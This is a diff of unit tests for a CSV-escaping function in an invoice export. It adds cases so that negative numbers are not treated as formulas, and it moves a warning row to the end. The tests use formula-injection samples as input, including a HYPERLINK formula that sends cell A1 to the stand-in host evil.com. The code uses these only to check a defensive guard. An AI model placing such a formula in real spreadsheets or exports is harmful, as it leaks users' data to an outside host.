@@ -32,13 +32,28 @@ describe("escapeCsvCell", () => {
     expect(escapeCsvCell("=HYPERLINK(\"http://evil.com/?d=\"&A1,\"Xem\")")).toBe(
       `"'=HYPERLINK(""http://evil.com/?d=""&A1,""Xem"")"`,
     );
-    expect(escapeCsvCell("=1+2")).toBe("'=1+2");
-    expect(escapeCsvCell("+SUM(A1:A10)")).toBe("'+SUM(A1:A10)");
-    expect(escapeCsvCell("-SUM(A1:A10)")).toBe("'-SUM(A1:A10)");
-    expect(escapeCsvCell("@SUM(A1:A10)")).toBe("'@SUM(A1:A10)");
     expect(escapeCsvCell("\t=CMD")).toBe("'\t=CMD");
     // \r triggers both formula-injection guard AND RFC 4180 quoting
     expect(escapeCsvCell("\r=CMD")).toBe(`"'\r=CMD"`);
+  });
+
+  it("does not prefix trigger characters when the value is a finite number", () => {
+    // Negative numbers are financial data, not formulas — prefixing them
+    // would make Excel treat them as text and break SUM / aggregation.
+    expect(escapeCsvCell("-42")).toBe("-42");
+    expect(escapeCsvCell("-42.5")).toBe("-42.5");
+    expect(escapeCsvCell("-.5")).toBe("-.5");
+    expect(escapeCsvCell(-42)).toBe("-42");
+    // + prefix on a plain number is also fine.
+    expect(escapeCsvCell("+42")).toBe("+42");
+  });
+
+  it("still prefixes non-numeric formula-trigger strings", () => {
+    // Non-numeric strings starting with -, =, +, @ must still be prefixed.
+    expect(escapeCsvCell("-SUM(A1:A10)")).toBe("'-SUM(A1:A10)");
+    expect(escapeCsvCell("=1+2")).toBe("'=1+2");
+    expect(escapeCsvCell("+SUM(A1:A10)")).toBe("'+SUM(A1:A10)");
+    expect(escapeCsvCell("@SUM(A1:A10)")).toBe("'@SUM(A1:A10)");
   });
 
   it("does not prefix non-trigger characters", () => {
@@ -187,8 +202,8 @@ describe("invoicesToCsv", () => {
 
     const csv = invoicesToCsv([row], { truncated: true });
     const lines = csv.trim().split("\n");
-    expect(lines).toHaveLength(3); // BOM + header, warning, data
-    expect(lines[1]).toContain("5,000"); // warning is row 2
-    expect(lines[2]).toContain("Acme"); // data is row 3
+    expect(lines).toHaveLength(3); // header, data, warning (at end)
+    expect(lines[1]).toContain("Acme"); // data is row 2
+    expect(lines[2]).toContain("5,000"); // warning is last row
   });
 });
